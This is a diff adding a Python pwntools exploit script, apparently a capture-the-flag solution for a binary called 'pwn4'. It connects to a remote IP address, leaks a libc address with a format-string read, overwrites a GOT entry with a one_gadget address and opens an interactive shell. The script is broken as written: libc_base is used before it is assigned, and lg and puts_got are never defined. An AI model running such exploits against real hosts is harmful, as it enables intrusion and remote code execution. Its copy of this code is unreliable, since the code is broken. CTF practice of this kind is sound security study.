@@ -1,0 +1,41 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.log_level = 'debug'
+
+s      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r      = lambda numb=4096          :p.recv(numb)
+rl      = lambda                    :p.recvline()
+ru      = lambda delims,drop=False  :p.recvuntil(delims,drop)
+uu32    = lambda data               :u32(data.ljust(4, '\x00'))
+uu64    = lambda data               :u64(data.ljust(8, '\x00'))
+info    = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+irt     = lambda                    :p.interactive()
+
+context.binary = './pwn4'
+elf=ELF('./pwn4')
+printf_got = elf.got['printf']
+printf_plt = elf.plt['printf']
+one_gadget = libc_base + 0x45226
+p =remote('219.219.61.234',10003)
+
+libc = elf.libc
+sla("important secret",'aaaa')
+sla(">>",'3')
+sla(">>",'3xpL0r3R')
+r()
+ru("ret\n")
+ru("ret\n")
+
+sl("%77$p")
+libc_base = int(r(15),16) - 0x20840
+lg(hex(libc_base))
+payload = fmtstr_payload(6,{puts_got:one_gadget})
+sl(payload)
+irt()
